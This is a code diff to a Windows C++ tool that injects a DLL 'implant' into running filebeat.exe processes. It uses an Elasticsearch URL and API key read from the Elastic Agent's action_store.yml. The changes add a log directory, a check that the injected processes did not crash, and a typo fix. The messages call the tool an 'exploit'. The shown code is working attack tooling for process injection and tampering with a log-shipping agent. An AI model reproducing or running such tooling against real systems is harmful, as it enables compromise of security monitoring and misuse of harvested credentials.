@@ -6,6 +6,7 @@
 #include <tchar.h>
 #include <wincrypt.h>
 #include <cstdlib>
+#include <synchapi.h>
 
 #include "Logger.h"
 
@@ -25,10 +26,11 @@ BOOL configure_data(DWORD, const wchar_t*, DWORD, const wchar_t*);
 BOOL inject_dll(DWORD, const char *);
 
 DWORD targetPids[MAX_PIDS+1] = { 0 };
+DWORD recheckPids[MAX_PIDS+1] = { 0 };
 
 int main(int argc, char **argv)
 {
-    DWORD ret, i, sz, es_port;
+    DWORD ret, i, sz, es_port, attribs;
     size_t offset;
     wchar_t b64_apikey[B64_API_KEY_MAX_LEN] = { 0 };
     wchar_t auth_header[AUTH_HEADER_LEN] = { 0 };
@@ -42,6 +44,15 @@ int main(int argc, char **argv)
         Logger::Error("You can get the URL/API key from C:\\Program Files\\Elastic\\Agent\\data\\elastic-agent-xxxxxx\\action_store.yml, at something like policy.outputs.default at the bottom");
         
         return 2;
+    }
+
+    // create log directory
+    // https://stackoverflow.com/a/6218445
+    attribs = GetFileAttributesA("C:\\inject_logs");
+    if (!(attribs != INVALID_FILE_ATTRIBUTES && attribs & FILE_ATTRIBUTE_DIRECTORY)) {
+        if (!CreateDirectoryA("C:\\inject_logs", NULL)) {
+            Logger::Error("Failed to make log directory at C:\\inject_logs");
+        }
     }
 
     // parse out the ES URL
@@ -99,6 +110,30 @@ int main(int argc, char **argv)
         }
     }
 
+    Logger::Info("Finished injecting, waiting to confirm stability");
+
+    // sleep for 5 seconds
+    Sleep(5000);
+
+    // copy existing pids
+    for (i = 0; i < MAX_PIDS; i++) {
+        recheckPids[i] = targetPids[i];
+    }
+
+    Logger::Info("Checking filebeat.exe PIDs again");
+
+    // get the PIDs again
+    get_filebeat_pids();
+
+    for (i = 0; i < MAX_PIDS; i++) {
+        if (targetPids[i] != recheckPids[i]) {
+            Logger::Error("A filebeat.exe process crashed, please manually kill all filebeat.exe processes and re-run this exploit");
+            return 1;
+        }
+    }
+
+    Logger::Info("All filebeat.exe processes are intact, exploit should be stable. Logs from the implant will be in C:\\inject_logs");
+
     return 0;
 }
 
@@ -147,7 +182,7 @@ BOOL configure_data(DWORD pid, const wchar_t* es_host, DWORD es_port, const wcha
     LPVOID data;
     size_t len;
 
-    Logger::Info("COnfiguring static data in pid %d", pid);
+    Logger::Info("Configuring static data in pid %d", pid);
     
     // open handle to target process
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
